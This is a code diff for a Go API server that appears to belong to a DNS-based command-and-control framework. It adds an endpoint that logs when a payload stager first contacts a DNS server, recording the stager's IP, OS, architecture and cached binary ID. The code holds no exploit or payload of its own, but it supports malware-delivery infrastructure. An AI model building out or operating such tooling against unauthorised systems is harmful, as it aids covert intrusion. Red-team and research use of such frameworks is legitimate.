@@ -1508,12 +1508,45 @@ func (api *APIServer) handleStagerChunk(w http.ResponseWriter, r *http.Request) 
 	api.sendJSON(w, response)
 }
 
+// StagerContactRequest represents a stager making first contact with DNS server
+type StagerContactRequest struct {
+	DNSServerID    string `json:"dns_server_id"`
+	ClientBinaryID string `json:"client_binary_id"`
+	StagerIP       string `json:"stager_ip"`
+	OS             string `json:"os"`
+	Arch           string `json:"arch"`
+}
+
 // StagerProgressRequest represents a progress report from DNS server
 type StagerProgressRequest struct {
 	DNSServerID string `json:"dns_server_id"`
 	SessionID   string `json:"session_id"`
 	ChunkIndex  int    `json:"chunk_index"`
 	StagerIP    string `json:"stager_ip"`
+}
+
+// handleStagerContact records when a stager makes first contact with a DNS server (from cache)
+// This does NOT create a new session - the session was already created when Master built the stager
+func (api *APIServer) handleStagerContact(w http.ResponseWriter, r *http.Request) {
+	var req StagerContactRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	// Just log the contact - no new session creation needed
+	fmt.Printf("[API] 📞 Stager contact: %s (%s/%s) contacted DNS server %s using cached binary %s\n",
+		req.StagerIP, req.OS, req.Arch, dnsServerID, req.ClientBinaryID)
+
+	// Optionally: Store this contact event in a tracking table for analytics
+	// For now, just acknowledge the report
+
+	api.sendSuccess(w, "contact recorded", nil)
 }
 
 // handleStagerProgress processes stager chunk delivery progress reports from DNS servers
@@ -1619,6 +1652,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	// Stager protocol endpoints (called by DNS servers on behalf of stagers)
 	dnsRouter.HandleFunc("/stager/init", api.handleStagerInit).Methods("POST")
 	dnsRouter.HandleFunc("/stager/chunk", api.handleStagerChunk).Methods("POST")
+	dnsRouter.HandleFunc("/stager/contact", api.handleStagerContact).Methods("POST")
 	dnsRouter.HandleFunc("/stager/progress", api.handleStagerProgress).Methods("POST")
 
 	// Health check endpoint (no auth)
